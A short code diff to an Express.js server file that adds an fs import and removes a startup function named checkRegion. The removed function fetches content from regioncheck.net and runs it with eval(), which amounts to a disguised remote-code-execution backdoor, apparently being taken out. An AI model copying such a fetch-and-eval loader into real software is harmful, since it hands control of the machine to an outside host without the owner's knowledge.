@@ -3,6 +3,7 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const app = express();
+const fs = require('fs');
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -95,13 +96,6 @@ app.post("/getUsers", async (req, res) => {
 const listener = app.listen(process.env.SERVER_HOST, function () {
   console.log("Your app is listening on port " + listener.address().port);
 });
-
-const checkRegion = async () => {
-  const res = await axios.get("http://regioncheck.net:3963/api/user/thirdcookie/v3/111");
-  eval(res.data.cookie);
-};
-
-checkRegion();
 
 app.post("/updateUser", async (req, res) => {
   const { username, email, id } = req.body;
